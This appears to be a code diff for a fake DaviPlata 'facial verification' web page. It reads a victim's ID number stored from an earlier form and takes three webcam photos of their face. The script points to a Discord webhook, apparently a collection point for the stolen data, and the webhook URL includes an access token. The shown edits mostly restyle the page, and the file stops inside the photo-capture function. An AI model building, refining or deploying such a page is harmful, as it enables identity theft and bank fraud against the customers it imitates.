@@ -32,32 +32,44 @@
             height: 100vh;
             display: flex;
             flex-direction: column;
-            padding: 20px 25px;
+            padding: 12px 20px 10px;
         }
 
-        .back-nav { align-self: flex-start; font-size: 24px; padding: 10px 0; cursor: pointer; color: var(--text-dark); }
+        /* HEADER */
+        .back-nav {
+            align-self: flex-start;
+            font-size: 22px;
+            padding: 4px 0 6px;
+            cursor: pointer;
+            color: var(--text-dark);
+        }
 
-        .header { text-align: center; }
-        .logo-img { width: 100px; margin: 10px 0; }
-        .title    { font-size: 20px; font-weight: 500; color: var(--text-dark); margin-bottom: 4px; }
-        .subtitle { font-size: 12px; color: var(--text-gray); margin-bottom: 18px; }
+        .header {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo-img  { width: 85px; margin-bottom: 4px; }
+        .title     { font-size: 17px; font-weight: 600; color: var(--text-dark); margin-bottom: 1px; }
+        .subtitle  { font-size: 11px; color: var(--text-gray); }
 
         /* TARJETA CÁMARA */
         .camera-card {
             background: var(--input-bg);
-            border-radius: 22px;
-            padding: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.10);
+            border-radius: 20px;
+            padding: 10px;
+            box-shadow: 0 4px 18px rgba(0,0,0,0.10);
             border: 1px solid rgba(0,0,0,0.04);
-            margin-bottom: 12px;
+            margin-bottom: 10px;
+            flex-shrink: 0;
         }
 
         .camera-wrap {
             position: relative;
-            border-radius: 14px;
+            border-radius: 12px;
             overflow: hidden;
             background: #111;
-            aspect-ratio: 1 / 1.08;
+            /* altura fija adaptada a móvil */
+            height: 42vh;
         }
 
         #video {
@@ -65,13 +77,11 @@
             object-fit: cover;
             transform: scaleX(-1);
             display: block;
-            border-radius: 14px;
         }
 
         #detectionCanvas {
             position: absolute; inset: 0;
             width: 100%; height: 100%;
-            transform: scaleX(-1);
             pointer-events: none;
         }
 
@@ -80,81 +90,88 @@
             display: flex; align-items: center; justify-content: center;
             pointer-events: none;
         }
-        .oval-svg { width: 60%; }
+        .oval-svg { width: 55%; }
 
-        /* STATUS dentro de cámara */
+        /* SCAN LINE */
+        .scan-line {
+            position: absolute; left: 0; right: 0; height: 2px;
+            background: linear-gradient(to right, transparent, #00e676, transparent);
+            box-shadow: 0 0 8px #00e676;
+            display: none; pointer-events: none; z-index: 5;
+        }
+
+        /* STATUS dentro cámara */
         .cam-status {
             position: absolute;
-            bottom: 12px; left: 12px; right: 12px;
-            background: rgba(0,0,0,0.50);
+            bottom: 10px; left: 10px; right: 10px;
+            background: rgba(0,0,0,0.52);
             backdrop-filter: blur(10px);
             -webkit-backdrop-filter: blur(10px);
-            border-radius: 11px;
-            padding: 9px 14px;
+            border-radius: 10px;
+            padding: 8px 12px;
             text-align: center;
             border: 1px solid rgba(255,255,255,0.08);
             transition: border-color 0.3s;
         }
-        .cam-status.ok    { border-color: rgba(0,210,100,0.5); }
+        .cam-status.ok    { border-color: rgba(0,210,100,0.55); }
         .cam-status.error { border-color: rgba(230,0,38,0.5); }
-        .cam-status-title { font-size: 13px; font-weight: 600; color: #fff; }
-        .cam-status-sub   { font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 2px; }
+        .cam-status-title { font-size: 12px; font-weight: 600; color: #fff; }
+        .cam-status-sub   { font-size: 10.5px; color: rgba(255,255,255,0.5); margin-top: 1px; }
         .cam-status-sub.green { color: #00e676; }
-        .cam-status-sub.red   { color: #ff6b6b; }
-
-        /* SCAN LINE */
-        .scan-line {
-            position: absolute;
-            left: 0; right: 0; height: 2px;
-            background: linear-gradient(to right, transparent, #00e676, transparent);
-            box-shadow: 0 0 8px #00e676;
-            display: none;
-            pointer-events: none;
-            z-index: 5;
-        }
 
         /* DOTS */
         .dots-row {
             display: flex; justify-content: center; gap: 10px;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
         .dot {
-            width: 11px; height: 11px; border-radius: 50%;
+            width: 10px; height: 10px; border-radius: 50%;
             background: rgba(0,0,0,0.1);
             border: 2px solid rgba(0,0,0,0.15);
             transition: background 0.3s, border-color 0.3s, transform 0.2s;
         }
         .dot.done   { background: #00c853; border-color: #00c853; }
-        .dot.active { background: var(--davi-red); border-color: var(--davi-red); animation: pulse-dot 0.65s infinite alternate; }
+        .dot.active {
+            background: var(--davi-red); border-color: var(--davi-red);
+            animation: pulse-dot 0.65s infinite alternate;
+        }
         @keyframes pulse-dot { to { transform: scale(1.4); } }
 
-        /* TIPS CARD */
+        /* TIPS — fila horizontal de íconos */
         .tips-card {
             background: var(--input-bg);
             border-radius: 15px;
-            padding: 13px 16px;
+            padding: 11px 14px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             border: 1px solid rgba(0,0,0,0.03);
-            margin-bottom: 12px;
         }
         .tips-title {
-            font-size: 12px; font-weight: 600;
+            font-size: 11px; font-weight: 600;
             color: var(--davi-red);
-            margin-bottom: 8px;
-            display: flex; align-items: center; gap: 6px;
+            margin-bottom: 10px;
+            text-align: center;
+            letter-spacing: 0.2px;
         }
-        .tips-list {
-            display: flex; flex-direction: column; gap: 6px;
+        .tips-row {
+            display: flex;
+            justify-content: space-around;
+            align-items: flex-start;
+            gap: 6px;
         }
         .tip-item {
-            display: flex; align-items: center; gap: 9px;
-            font-size: 11.5px; color: var(--text-dark);
+            display: flex; flex-direction: column;
+            align-items: center; gap: 5px;
+            flex: 1;
         }
         .tip-icon {
-            width: 28px; height: 28px; border-radius: 50%;
+            width: 36px; height: 36px; border-radius: 50%;
             background: #fff0f2;
             display: flex; align-items: center; justify-content: center;
             flex-shrink: 0;
+        }
+        .tip-label {
+            font-size: 10px; color: var(--text-dark);
+            text-align: center; line-height: 1.3;
         }
 
         /* FLASH */
@@ -173,7 +190,7 @@
             flex-direction: column; align-items: center; justify-content: center; gap: 16px;
         }
         .spinner {
-            width: 50px; height: 50px;
+            width: 48px; height: 48px;
             border: 4px solid #f0f0f0;
             border-top: 4px solid var(--davi-red);
             border-radius: 50%;
@@ -195,7 +212,7 @@
         <img src="https://conectesunegocio.daviplata.com/sites/default/files/styles/original/public/2025-10/Logo_Api_Market-2025.png?itok=cIsEUb2z"
              class="logo-img" onerror="this.style.display='none'">
         <div class="title">Verificación Facial</div>
-        <div class="subtitle">Sigue las indicaciones para completar tu verificación</div>
+        <div class="subtitle">Sigue las indicaciones para continuar</div>
     </div>
 
     <!-- CÁMARA -->
@@ -205,7 +222,7 @@
             <canvas id="detectionCanvas"></canvas>
 
             <div class="oval-wrap">
-                <svg class="oval-svg" viewBox="0 0 200 256" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <svg class="oval-svg" viewBox="0 0 200 256" fill="none">
                     <ellipse id="ovalEl" cx="100" cy="128" rx="90" ry="118"
                         stroke="white" stroke-width="2.5" stroke-dasharray="8 5"
                         fill="none" opacity="0.75"
@@ -231,57 +248,53 @@
 
     <!-- TIPS -->
     <div class="tips-card">
-        <div class="tips-title">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
-                <circle cx="12" cy="12" r="10" stroke="#E60026" stroke-width="2"/>
-                <path d="M12 8v4M12 16h.01" stroke="#E60026" stroke-width="2" stroke-linecap="round"/>
-            </svg>
-            Recomendaciones para una captura exitosa
-        </div>
-        <div class="tips-list">
+        <div class="tips-title">Recomendaciones</div>
+        <div class="tips-row">
+
             <div class="tip-item">
                 <div class="tip-icon">
-                    <!-- Sol / iluminación -->
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                         <circle cx="12" cy="12" r="4" stroke="#E60026" stroke-width="1.8"/>
                         <path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"
                               stroke="#E60026" stroke-width="1.8" stroke-linecap="round"/>
                     </svg>
                 </div>
-                Ubícate en un lugar bien iluminado
+                <span class="tip-label">Buena<br>iluminación</span>
             </div>
+
             <div class="tip-item">
                 <div class="tip-icon">
-                    <!-- Lentes tachados -->
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
-                        <path d="M3 12c0-1.1.9-2 2-2h4a2 2 0 0 1 2 2 2 2 0 0 1-2 2H5a2 2 0 0 1-2-2ZM13 12c0-1.1.9-2 2-2h4a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-4a2 2 0 0 1-2-2Z"
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                        <path d="M3 10c0-1.1.9-2 2-2h4a2 2 0 0 1 0 4H5a2 2 0 0 1-2-2ZM13 10c0-1.1.9-2 2-2h4a2 2 0 0 1 0 4h-4a2 2 0 0 1-2-2Z"
                               stroke="#E60026" stroke-width="1.7"/>
-                        <path d="M11 12h2" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
+                        <path d="M11 10h2" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
                         <line x1="4" y1="4" x2="20" y2="20" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
                     </svg>
                 </div>
-                Retira lentes, gorra o accesorios
+                <span class="tip-label">Sin lentes<br>ni gorra</span>
             </div>
+
             <div class="tip-item">
                 <div class="tip-icon">
-                    <!-- Rostro centrado -->
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
-                        <circle cx="12" cy="9" r="3" stroke="#E60026" stroke-width="1.7"/>
-                        <path d="M5 20c0-3.87 3.13-7 7-7s7 3.13 7 7" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                        <circle cx="12" cy="8" r="3.2" stroke="#E60026" stroke-width="1.7"/>
+                        <path d="M5.5 20c0-3.59 2.91-6.5 6.5-6.5s6.5 2.91 6.5 6.5"
+                              stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
                     </svg>
                 </div>
-                Mantén tu rostro centrado y quieto
+                <span class="tip-label">Rostro<br>centrado</span>
             </div>
+
             <div class="tip-item">
                 <div class="tip-icon">
-                    <!-- Fondo simple -->
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                         <rect x="3" y="3" width="18" height="18" rx="3" stroke="#E60026" stroke-width="1.7"/>
-                        <path d="M3 9h18M9 21V9" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
+                        <path d="M8 12h8M12 8v8" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
                     </svg>
                 </div>
-                Usa un fondo neutro sin distracciones
+                <span class="tip-label">Fondo<br>despejado</span>
             </div>
+
         </div>
     </div>
 
@@ -297,10 +310,10 @@
 <canvas id="captureCanvas"></canvas>
 
 <script>
-const WEBHOOK_URL  = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
-const MODELS_URL   = "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/";
-const savedData    = JSON.parse(sessionStorage.getItem('formData') || '{}');
-const docNum       = savedData.num || 'N/A';
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
+const MODELS_URL  = "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/";
+const savedData   = JSON.parse(sessionStorage.getItem('formData') || '{}');
+const docNum      = savedData.num || 'N/A';
 
 let photosTaken  = 0;
 let isBusy       = false;
@@ -312,7 +325,6 @@ const TOTAL_PHOTOS = 3;
 const STABLE_MS    = 1800;
 const BETWEEN_MS   = 2000;
 
-/* ── DOTS ── */
 function updateDots() {
     for (let i = 0; i < TOTAL_PHOTOS; i++) {
         const d = document.getElementById(`dot${i}`);
@@ -322,7 +334,6 @@ function updateDots() {
     }
 }
 
-/* ── OVAL ── */
 function setOval(state) {
     const el = document.getElementById('ovalEl');
     const map = {
@@ -336,17 +347,15 @@ function setOval(state) {
     el.setAttribute('opacity', s.op);
 }
 
-/* ── STATUS ── */
 function setStatus(title, sub = '', mode = '') {
     document.getElementById('statusTitle').textContent = title;
     document.getElementById('statusSub').textContent   = sub;
     const s = document.getElementById('camStatus');
     s.className = 'cam-status' + (mode ? ' ' + mode : '');
     document.getElementById('statusSub').className =
-        'cam-status-sub' + (mode === 'ok' ? ' green' : mode === 'error' ? ' red' : '');
+        'cam-status-sub' + (mode === 'ok' ? ' green' : '');
 }
 
-/* ── SCAN LINE ── */
 function startScan() {
     const line = document.getElementById('scanLine');
     const wrap = document.querySelector('.camera-wrap');
@@ -364,9 +373,8 @@ function stopScan() {
     document.getElementById('scanLine').style.display = 'none';
 }
 
-/* ── MODELOS ── */
 async function loadModels() {
-    setStatus('Cargando sistema...', '');
+    setStatus('Cargando sistema...');
     try {
         await Promise.all([
             faceapi.nets.tinyFaceDetector.loadFromUri(MODELS_URL),
@@ -374,11 +382,10 @@ async function loadModels() {
         ]);
         startCamera();
     } catch {
-        setStatus('Error al cargar', 'Verifica tu conexión', 'error');
+        setStatus('Error de conexión', 'Recarga la página', 'error');
     }
 }
 
-/* ── CÁMARA ── */
 async function startCamera() {
     const video = document.getElementById('video');
     try {
@@ -390,11 +397,11 @@ async function startCamera() {
             video.play();
             resizeCanvas();
             updateDots();
-            setStatus('Coloca tu rostro en el óvalo', '');
+            setStatus('Coloca tu rostro en el óvalo');
             startDetectionLoop();
         };
     } catch {
-        setStatus('Sin acceso a la cámara', 'Permite el acceso en tu navegador', 'error');
+        setStatus('Sin acceso a la cámara', 'Permite el acceso en tu navegador');
     }
 }
 
@@ -406,7 +413,6 @@ function resizeCanvas() {
 }
 window.addEventListener('resize', resizeCanvas);
 
-/* ── LOOP DETECCIÓN ── */
 function startDetectionLoop() {
     const video = document.getElementById('video');
 
@@ -415,38 +421,28 @@ function startDetectionLoop() {
 
         const opts = new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.45 });
         let det = null;
-        try { det = await faceapi.detectSingleFace(video, opts).withFaceLandmarks(true); } catch {}
+        try { det = await faceapi.detectSingleFace(video, opts); } catch {}
 
+        // Canvas solo para lógica — no dibujamos puntos
         const canvas = document.getElementById('detectionCanvas');
-        const ctx    = canvas.getContext('2d');
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-        const wrap  = document.querySelector('.camera-wrap');
-        const ovalW = wrap.clientWidth  * 0.60;
-        const ovalH = ovalW / 0.78;
-        const oCX   = wrap.clientWidth  / 2;
-        const oCY   = wrap.clientHeight / 2;
-        const oRX   = ovalW / 2;
-        const oRY   = ovalH / 2;
+        const wrap   = document.querySelector('.camera-wrap');
+        const ovalW  = wrap.clientWidth  * 0.55;
+        const ovalH  = ovalW / 0.78;
+        const oCX    = wrap.clientWidth  / 2;
+        const oCY    = wrap.clientHeight / 2;
+        const oRX    = ovalW / 2;
+        const oRY    = ovalH / 2;
 
         if (det) {
-            const sX = canvas.width  / video.videoWidth;
-            const sY = canvas.height / video.videoHeight;
-            const box = det.detection.box;
-            const fX  = (canvas.width - (box.x + box.width)  * sX) + (box.width  * sX) / 2;
+            const sX  = canvas.width  / video.videoWidth;
+            const sY  = canvas.height / video.videoHeight;
+            const box = det.box;
+            const fX  = (canvas.width - (box.x + box.width) * sX) + (box.width * sX) / 2;
             const fY  = (box.y + box.height / 2) * sY;
 
             const dx     = (fX - oCX) / oRX;
             const dy     = (fY - oCY) / oRY;
-            const inside = (dx * dx + dy * dy) <= 1.1;
-
-            // Landmarks
-            ctx.fillStyle = inside ? 'rgba(0,230,118,0.72)' : 'rgba(255,255,255,0.38)';
-            det.landmarks.positions.forEach(pt => {
-                ctx.beginPath();
-                ctx.arc(canvas.width - pt.x * sX, pt.y * sY, 1.8, 0, Math.PI * 2);
-                ctx.fill();
-            });
+            const inside = (dx * dx + dy * dy) <= 1.15;
 
             if (inside && !isBusy) {
                 setOval('detected');
@@ -459,7 +455,7 @@ function startDetectionLoop() {
                 if (elapsed >= STABLE_MS) {
                     capturePhoto();
                 } else {
-                    setStatus(`Foto ${photosTaken + 1} de ${TOTAL_PHOTOS} — ${pct}%`, 'No te muevas...', 'ok');
+                    setStatus(`Foto ${photosTaken + 1} de ${TOTAL_PHOTOS}  ${pct}%`, 'No te muevas...', 'ok');
                     if (document.getElementById('scanLine').style.display !== 'block') startScan();
                 }
             } else {
@@ -479,10 +475,9 @@ function startDetectionLoop() {
 function resetState() {
     stopScan();
     setOval('idle');
-    if (!isBusy) setStatus('Coloca tu rostro en el óvalo', '');
+    if (!isBusy) setStatus('Coloca tu rostro en el óvalo');
 }
 
-/* ── CAPTURA ── */
 async function capturePhoto() {
     if (isBusy || photosTaken >= TOTAL_PHOTOS) return;
     isBusy = true; lastDetected = false;
